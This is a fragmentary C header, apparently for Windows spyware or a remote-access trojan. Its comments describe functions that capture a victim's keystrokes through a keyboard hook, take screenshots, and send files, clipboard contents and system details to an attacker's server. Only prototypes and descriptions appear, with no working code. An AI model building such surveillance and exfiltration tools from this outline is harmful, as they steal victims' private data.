...
/***********************************************************************
 ...
 DESCRIPTION: Files/directories are listed and sent to the attacking
			  server.
*************************************************************************/
...
/***********************************************************************
 ...
 DESCRIPTION: Screenshot is taken of the victims screen and saved.
*************************************************************************/
int screenshot();
...
/***********************************************************************
 ...
 PARAMS: 1. LPTSTR = Filepath where the screenshot will be saved.
 ...
 DESCRIPTION: Writes file with contents of the user's screenshot.
*************************************************************************/
...
/***********************************************************************
 ...
 PARAMS: 1. HBITMAP = Bitmap handle.

 RETURNS: PBITMAPINFO = Bitmap data for it to be formed later.

 DESCRIPTION: Gives values to the bitmap header for file to be formed
			  later.
*************************************************************************/
...
/***********************************************************************
 ...
 DESCRIPTION: Creates a keyboard hook to capture the victims keystrokes.
*************************************************************************/
int keylogger();
...
/***********************************************************************
 ...
 PARAMS: 1. int = Value of latest pressed key
		 2. WPARAM =  The identifier of the keyboard message.
		 3. LPARAM = A pointer to a KBDLLHOOKSTRUCT structure.

 RETURNS: int = 0 - returned successfully, 1 - returned with error

 DESCRIPTION: Maps the incoming value from the key pressed to a string.
*************************************************************************/
...
/***********************************************************************
 ...
 DESCRIPTION: Sends the Victim's clipboard contents to Attacker's server.
*************************************************************************/
int clipboard();
...
/***********************************************************************
 ...
 DESCRIPTION: calls getUserInfo, getMemoryUsage, getSystemInfo
*************************************************************************/
int getIntel();
...
/***********************************************************************
 ...
 DESCRIPTION: Sends the Victim's computer information to Attacker's 
			  server.
*************************************************************************/
int getUserInfo();
...
/***********************************************************************
 ...
 DESCRIPTION: Sends the Victim's memory usage stats to Attacker's server.
*************************************************************************/
int getMemoryUsage();
